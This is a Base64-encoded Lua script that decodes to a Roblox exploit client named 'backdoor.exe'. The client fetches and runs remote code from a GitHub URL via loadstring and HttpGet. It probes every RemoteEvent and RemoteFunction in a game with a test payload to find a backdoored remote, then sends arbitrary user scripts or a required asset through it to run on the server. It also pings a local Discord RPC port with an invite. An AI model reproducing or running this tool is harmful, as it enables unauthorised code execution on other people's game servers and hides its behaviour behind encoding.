-- Encoded Scripte starts here
DQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikNCmxvY2FsIENvcmVHdWkgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKQ0KbG9jYWwgTGlnaHRpbmcgPSBnYW1lOkdldFNlcnZpY2UoIkxpZ2h0aW5nIik7DQpsb2NhbCBXb3Jrc3BhY2UgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOw0KbG9jYWwgSm9pbnRzU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSm9pbnRzU2VydmljZSIpDQpsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQ0KbG9jYWwgUm9ibG94UmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJvYmxveFJlcGxpY2F0ZWRTdG9yYWdlIikNCiANCi0tIFZhcmlhYmxlcw0KbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyDQpsb2NhbCBSb2Jsb3hHdWkgPSBDb3JlR3VpLlJvYmxveEd1aQ0KIA0KLS0gRnVuY3Rpb25zDQpsb2NhbCBkYXRlVGltZU5vdyA9IERhdGVUaW1lLm5vdw0KbG9jYWwgdGFibGVGaW5kID0gdGFibGUuZmluZA0KbG9jYWwgdGFza1NwYXduID0gdGFzay5zcGF3bg0KbG9jYWwgdGFza1dhaXQgPSB0YXNrLndhaXQNCmxvY2FsIHN0cmluZ1JlcCA9IHN0cmluZy5yZXANCmxvY2FsIG1hdGhSYW5kb20gPSBtYXRoLnJhbmRvbQ0KIA0KLS0gR2xvYmFscw0KbG9jYWwgYXR0YWNoZWQgPSBmYWxzZTsNCmxvY2FsIGJhY2tkb29yID0gbmlsOw0KbG9jYWwgY29tbW9uUGxhY2VzID0gew0KICAgIFJlcGxpY2F0ZWRTdG9yYWdlLA0KICAgIFdvcmtzcGFjZSwNCiAgICBMaWdodGluZw0KfTsNCmxvY2FsIHJlbW90ZUNvZGVzID0ge307DQogDQotLSBDb25zdGFudHMNCmxvY2FsIElOVl9DT0RFID0gInhKSENxbTg0Y1ciOw0KbG9jYWwgU1RSSU5HX1ZBTFVFX05BTUUgPSBtYXRoUmFuZG9tKDEwMDAwMDAsIDk5OTk5OTkpOw0KIA0KIA0KaWYgUm9ibG94R3VpOkZpbmRGaXJzdENoaWxkKCJWNiIpIHRoZW4gUm9ibG94R3VpOkZpbmRGaXJzdENoaWxkKCJWNiIpOkRlc3Ryb3koKTsgcHJpbnQoIlJlZnJlc2hlZCIpOyBlbmQNCmxvY2FsIFZhcmlhYmxlcyA9IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaUs0b1MvYmFja2Rvb3IuZXhlL2luZGV2L3VpLmx1YSIpKSgpDQogDQpWYXJpYWJsZXMuVUkuTWFpbi5BY3RpdmUgPSB0cnVlDQpWYXJpYWJsZXMuVUkuTWFpbi5EcmFnZ2FibGUgPSB0cnVlDQogDQpsb2NhbCBmdW5jdGlvbiBub3RpZnkodGV4dCxjYixiMSxiMikNCiAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKA0KICAgICAgICAiU2VuZE5vdGlmaWNhdGlvbiIsew0KICAgICAgICAgICAgVGl0bGUgPSAiYmFja2Rvb3IuZXhlIiwNCiAgICAgICAgICAgIER1cmF0aW9uID0gMywNCiAgICAgICAgICAgIFRleHQgPSB0ZXh0LA0KICAgICAgICAgICAgQ2FsbGJhY2sgPSBjYiwNCiAgICAgICAgICAgIEJ1dHRvbjEgPSBiMSwNCiAgICAgICAgICAgIEJ1dHRvbjIgPSBiMg0KICAgICAgICB9DQogICAgKQ0KZW5kDQogDQpsb2NhbCBmdW5jdGlvbiB2YWxpZFJlbW90ZShybSkNCiAgICBsb2NhbCBQYXJlbnQgPSBybS5QYXJlbnQNCiAgICBsb2NhbCBjbGFzcyA9IHJtLkNsYXNzTmFtZQ0KICAgIGlmIGNsYXNzIH49ICJSZW1vdGVFdmVudCIgYW5kIGNsYXNzIH49ICJSZW1vdGVGdW5jdGlvbiIgdGhlbiByZXR1cm4gZmFsc2UgZW5kDQogDQogICAgaWYgUGFyZW50IHRoZW4NCiAgICAgICAgaWYgUGFyZW50ID09IEpvaW50c1NlcnZpY2UgdGhlbiByZXR1cm4gZmFsc2UgZW5kDQogICAgICAgIGlmIChQYXJlbnQgPT0gUmVwbGljYXRlZFN0b3JhZ2UgYW5kIHJtOkZpbmRGaXJzdENoaWxkKCJfX0ZVTkNUSU9OIikpIG9yDQogICAgICAgIChybS5OYW1lID09ICJfX0ZVTkNUSU9OIiBhbmQgUGFyZW50LkNsYXNzTmFtZSA9PSAiUmVtb3RlRXZlbnQiIGFuZCBQYXJlbnQuUGFyZW50ID09IFJlcGxpY2F0ZWRTdG9yYWdlKSB0aGVuIHJldHVybiBmYWxzZSBlbmQNCiAgICBlbmQNCiANCiAgICBpZiBybTpJc0Rlc2NlbmRhbnRPZihSb2Jsb3hSZXBsaWNhdGVkU3RvcmFnZSkgdGhlbiByZXR1cm4gZmFsc2UgZW5kDQogDQogICAgcmV0dXJuIHRydWUNCmVuZA0KIA0KbG9jYWwgZnVuY3Rpb24gc2NhbkRlc2NlbmRhbnRzKHBhcmVudCkNCiAgICBsb2NhbCBkZXNjZW5kYW5jZSA9IHBhcmVudDpHZXREZXNjZW5kYW50cygpOw0KICAgIGZvciBpPTEsICNkZXNjZW5kYW5jZSBkbw0KICAgICAgICBsb2NhbCBkZXNjZW5kYW50ID0gZGVzY2VuZGFuY2VbaV07DQogDQogDQogICAgICAgIGlmIG5vdCB2YWxpZFJlbW90ZShkZXNjZW5kYW50KSB0aGVuIGNvbnRpbnVlOyBlbmQNCiANCiAgICAgICAgLS1pZiAjcmVtb3RlQ29kZXMgPT0gNSB0aGVuIHJlbW90ZUNvZGVzLmNsZWFyKCk7IGVuZA0KICAgICAgICBsb2NhbCByZW1vdGVDb2RlID0gdG9zdHJpbmcobWF0aFJhbmRvbSgxMDAwMDAsIDk5OTk5OSkpOw0KICAgICAgICByZW1vdGVDb2Rlc1tyZW1vdGVDb2RlXSA9IGRlc2NlbmRhbnQ7DQogDQogICAgICAgIGxvY2FsIHJlbW90ZUNsYXNzID0gZGVzY2VuZGFudC5DbGFzc05hbWUNCiAgICAgICAgbG9jYWwgcmVxdWlyZVNjcmlwdCA9ICgiaT1JbnN0YW5jZS5uZXcoJ1N0cmluZ1ZhbHVlJywgZ2FtZS5Xb3Jrc3BhY2UpOyBpLk5hbWU9JyVzJzsgaS5WYWx1ZT0nJXMnIik6Zm9ybWF0KFNUUklOR19WQUxVRV9OQU1FLCByZW1vdGVDb2RlKQ0KIA0KICAgICAgICBpZiByZW1vdGVDbGFzcyA9PSAiUmVtb3RlRXZlbnQiIHRoZW4NCiAgICAgICAgICAgIGRlc2NlbmRhbnQ6RmlyZVNlcnZlcihyZXF1aXJlU2NyaXB0KQ0KIA0KICAgICAgICBlbHNlaWYgcmVtb3RlQ2xhc3MgPT0gIlJlbW90ZUZ1bmN0aW9uIiB0aGVuDQogICAgICAgICAgICBsb2NhbCB3YWl0aW5nID0gdHJ1ZQ0KICAgICAgICAgICAgdGFza1NwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICBkZXNjZW5kYW50Okludm9rZVNlcnZlcihyZXF1aXJlU2NyaXB0KQ0KICAgICAgICAgICAgICAgIHdhaXRpbmcgPSBuaWwNCiAgICAgICAgICAgIGVuZCkNCiANCiAgICAgICAgICAgIC0tIElmIFJlbW90ZUZ1bmN0aW9uIGRvbid0IHJlc3BvbmQgaW4gMSBzZWNvbmQsIHdlIHNraXAgdGhpcyBvbmUuDQogICAgICAgICAgICBsb2NhbCBzdGFydCA9IGRhdGVUaW1lTm93KCkuVW5peFRpbWVzdGFtcE1pbGxpcw0KICAgICAgICAgICAgd2hpbGUgd2FpdGluZyBhbmQgMTAwMCA+IGRhdGVUaW1lTm93KCkuVW5peFRpbWVzdGFtcE1pbGxpcyAtIHN0YXJ0IGRvDQogICAgICAgICAgICAgICAgdGFza1dhaXQoKQ0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZA0KIA0KICAgICAgICBpZiBXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoU1RSSU5HX1ZBTFVFX05BTUUpIHRoZW4NCiAgICAgICAgICAgIGF0dGFjaGVkID0gdHJ1ZQ0KICAgICAgICAgICAgYmFja2Rvb3IgPSByZW1vdGVDb2Rlc1tXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoU1RSSU5HX1ZBTFVFX05BTUUpLlZhbHVlXQ0KICAgICAgICAgICAgYmFja2Rvb3I6RmlyZVNlcnZlcigoImdhbWUuV29ya3NwYWNlWyclcyddOkRlc3Ryb3koKSIpOmZvcm1hdChTVFJJTkdfVkFMVUVfTkFNRSkpIC0tIENsZWFuaW5nIHVwIGFmdGVyIHRvbnVtYmVyc2VsdmVzDQogDQogICAgICAgICAgICByZXR1cm4gdHJ1ZQ0KICAgICAgICBlbmQNCiAgICBlbmQNCmVuZA0KbG9jYWwgZnVuY3Rpb24gc2NhbkdhbWUoKQ0KICAgIGxvY2FsIGZvdW5kID0gZmFsc2UNCiAgICAtLSBTY2FuIENvbW1vbiBQbGFjZXMNCiAgICBmb3IgaT0xLCAjY29tbW9uUGxhY2VzIGRvDQogICAgICAgIGxvY2FsIHBsYWNlID0gY29tbW9uUGxhY2VzW2ldOw0KICAgICAgICBpZiBzY2FuRGVzY2VuZGFudHMocGxhY2UpIHRoZW4NCiAgICAgICAgICAgIGZvdW5kID0gdHJ1ZQ0KICAgICAgICBlbmQNCiAgICBlbmQNCiAgICAtLSBTY2FuIHRoZSByZXN0IG9mIHRoZSBnYW1lDQogICAgbG9jYWwgY2hpbGRyZW4gPSBnYW1lOkdldENoaWxkcmVuKCk7DQogICAgZm9yIGk9MSwgI2NoaWxkcmVuIGRvDQogICAgICAgIGxvY2FsIGNoaWxkID0gY2hpbGRyZW5baV07DQogICAgICAgIC0tIFdlIG9mY291cnNlIGRvbid0IG5lZWQgdG8gY2hlY2sgdGhlIGNvbW1vbiBwbGFjZXMgYWdhaW4sIGRvIHdlPw0KICAgICAgICBpZiB0YWJsZUZpbmQoY29tbW9uUGxhY2VzLCBjaGlsZCkgdGhlbiBjb250aW51ZTsgZW5kDQogDQogICAgICAgIGlmIHNjYW5EZXNjZW5kYW50cyhjaGlsZCkgdGhlbiANCiAgICAgICAgICAgIGZvdW5kID0gdHJ1ZQ0KICAgICAgICBlbmQNCiAgICBlbmQNCiAgICBpZiBmb3VuZCB0aGVuDQogICAgICAgIG5vdGlmeSgiVW5hYmxlIHRvIGZpbmQgYmFja2Rvb3IhIikNCiAgICAgICAgVmFyaWFibGVzLlRvcGJhci5TdGF0dXMuVGV4dCA9ICJGYWlsZWQiDQogICAgICAgIFZhcmlhYmxlcy5Ub3BiYXIuU3RhdHVzLkNpcmNsZS5TdGF0dXNfQ29sb3IuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI0NywgMCwgMCkNCiAgICBlbHNlDQogICAgICAgIG5vdGlmeSgiQmFja2Rvb3IgRm91bmQhIikNCiAgICAgICAgVmFyaWFibGVzLlRvcGJhci5TdGF0dXMuVGV4dCA9ICJBdHRhY2hlZCINCiAgIFZhcmlhYmxlcy5Ub3BiYXIuU3RhdHVzLkNpcmNsZS5TdGF0dXNfQ29sb3IuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIxLCAyNTUsIDApDQogDQogIGVuZA0KICAgIHJldHVybiBmb3VuZDsNCmVuZA0KbG9jYWwgZnVuY3Rpb24gZXhlY3V0ZVNjcmlwdChzY3JpcHQpDQogICAgaWYgbm90IGF0dGFjaGVkIHRoZW4NCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gY2FsbGJhY2sodGV4dCkNCiAgICAgICAgICAgIGlmIHRleHQgPT0gIlllcyIgdGhlbg0KICAgICAgICAgICAgICAgIGlmIHNjYW5HYW1lKCkgdGhlbg0KICAgICAgICAgICAgICAgICAgICBleGVjdXRlU2NyaXB0KHNjcmlwdCkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVsc2VpZiB0ZXh0ID09ICJObyIgdGhlbg0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZA0KIA0KICAgICAgICBsb2NhbCBiZiA9IEluc3RhbmNlLm5ldygiQmluZGFibGVGdW5jdGlvbiIpOyBiZi5Pbkludm9rZSA9IGNhbGxiYWNrDQogICAgICAgIG5vdGlmeSgiWW91J3JlIG5vdCBhdHRhY2hlZC5cbldvdWxkIHlvdSBsaWtlIHRvIGF0dGFjaCBub3c/IiwgYmYsICJZZXMiLCAiTm8iLCAiSSBkb250IGtub3cgbG9sIikNCiAgICAgICAgcmV0dXJuDQogICAgZW5kDQogDQogICAgbG9jYWwgc2NyaXB0ID0gc2NyaXB0IG9yIFZhcmlhYmxlcy5Tb3VyY2VGcmFtZS5Tb3VyY2UuVGV4dA0KICAgIGlmIGJhY2tkb29yLkNsYXNzTmFtZSA9PSAiUmVtb3RlRXZlbnQiIHRoZW4NCiAgICAgICAgYmFja2Rvb3I6RmlyZVNlcnZlcihzY3JpcHQpDQogICAgZWxzZWlmIGJhY2tkb29yLkNsYXNzTmFtZSA9PSAiUmVtb3RlRnVuY3Rpb24iIHRoZW4NCiAgICAgICAgYmFja2Rvb3I6SW52b2tlU2VydmVyKHNjcmlwdCkNCiAgICBlbmQNCmVuZA0KIA0KIA0KIA0KIA0KIA0KbG9jYWwgZnVuY3Rpb24gcHJvbXREaXNjb3JkSW52aXRlKCkNCiAgICBsb2NhbCBodHRwU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQ0KICAgIGxvY2FsIGh0dHBSZXF1ZXN0ID0gKHN5biBhbmQgc3luLnJlcXVlc3QpIG9yIChodHRwU2VydmljZSBhbmQgaHR0cFNlcnZpY2UucmVxdWVzdCkgb3IgaHR0cF9yZXF1ZXN0DQogDQogICAgaWYgbm90IGh0dHBSZXF1ZXN0IHRoZW4gc2V0Y2xpcGJvYXJkKElOVl9DT0RFKSBub3RpZnkoIkludml0ZSBjb2RlIGNvcGllZCEiKSByZXR1cm4gZW5kDQogDQogICAgbG9jYWwgcmVxdWVzdCA9IGh0dHBSZXF1ZXN0KHsNCiAgICAgICAgVXJsID0gImh0dHA6Ly8xMjcuMC4wLjE6NjQ2My9ycGM/dj0xIiwNCiAgICAgICAgTWV0aG9kID0gIlBPU1QiLA0KIA0KICAgICAgICBIZWFkZXJzID0gew0KICAgICAgICAgICAgWydDb250ZW50LVR5cGUnXSA9ICdhcHBsaWNhdGlvbi9qc29uJywNCiAgICAgICAgICAgIE9yaWdpbiA9ICdodHRwczovL2Rpc2NvcmQuY29tJw0KICAgICAgICB9LA0KIA0KICAgICAgICBCb2R5ID0gaHR0cFNlcnZpY2U6SlNPTkVuY29kZSh7DQogICAgICAgICAgICBhcmdzID0ge2NvZGUgPSBJTlZfQ09ERX0sDQogICAgICAgICAgICBjbWQgPSAnSU5WSVRFX0JST1dTRVInLA0KICAgICAgICAgICAgbm9uY2UgPSBodHRwU2VydmljZTpHZW5lcmF0ZUdVSUQoZmFsc2UpDQogICAgICAgIH0pDQogICAgfSkNCiANCiAgICBpZiByZXF1ZXN0LlN0YXR1c0NvZGUgfj0gMjAwIG9yIGh0dHBTZXJ2aWNlOkpTT05EZWNvZGUocmVxdWVzdC5Cb2R5KS5kYXRhLmNvZGUgPT0gNDAxMSB0aGVuDQogICAgICAgIG5vdGlmeSgiSW52aXRlIGNvZGUgY29waWVkISIpIA0KICAgICAgICBzZXRjbGlwYm9hcmQoSU5WX0NPREUpDQogICAgICAgIHJldHVybg0KICAgIGVuZA0KIA0KICAgIG5vdGlmeSgiWW91IGhhdmUgYmVlbiBwcm9tdGVkIHRvIGpvaW4gb3VyIERpc2NvcmQuIE9wZW4geW91ciBEaXNjb3JkLiIpDQogDQplbmQNCiANClZhcmlhYmxlcy5Ub3BiYXIuQ2xvc2VCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpIFZhcmlhYmxlcy5VSTpEZXN0cm95KCkgZW5kKQ0KVmFyaWFibGVzLlRvcGJhci5SNkJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkgZXhlY3V0ZVNjcmlwdCgoInJlcXVpcmUoMzA0MTE3NTkzNyk6cjYoJyVzJykiKTpmb3JtYXQoTG9jYWxQbGF5ZXIuTmFtZSkpIGVuZCkNClZhcmlhYmxlcy5NYWluQnV0dG9ucy5TY2FuQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3Qoc2NhbkdhbWUpDQpWYXJpYWJsZXMuTWFpbkJ1dHRvbnMuRXhlY3V0ZUJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGV4ZWN1dGVTY3JpcHQpDQpWYXJpYWJsZXMuTWFpbkJ1dHRvbnMuQ2xlYXJCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpIFZhcmlhYmxlcy5Tb3VyY2VGcmFtZS5Tb3VyY2UuVGV4dCA9ICIiIGVuZCkNClZhcmlhYmxlcy5NYWluQnV0dG9ucy5IaWRlQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKSBWYXJpYWJsZXMuU291cmNlRnJhbWUuU291cmNlLlZpc2libGUgPSBub3QgVmFyaWFibGVzLlNvdXJjZUZyYW1lLlNvdXJjZS5WaXNpYmxlIGVuZCkNClZhcmlhYmxlcy5NYWluQnV0dG9ucy5JbnZpdGVCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChwcm9tdERpc2NvcmRJbnZpdGUpDQog
